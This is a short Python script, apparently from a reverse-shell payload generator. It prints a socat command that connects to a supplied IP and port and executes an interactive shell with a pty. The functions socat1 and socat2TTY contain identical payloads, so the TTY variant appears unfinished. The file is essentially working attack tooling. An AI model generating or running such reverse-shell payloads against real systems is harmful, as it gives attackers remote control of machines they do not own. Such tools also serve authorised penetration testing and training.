from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def socat1(ip, port):
    payload = f"socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def socat2TTY(ip, port):
    payload = f"socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")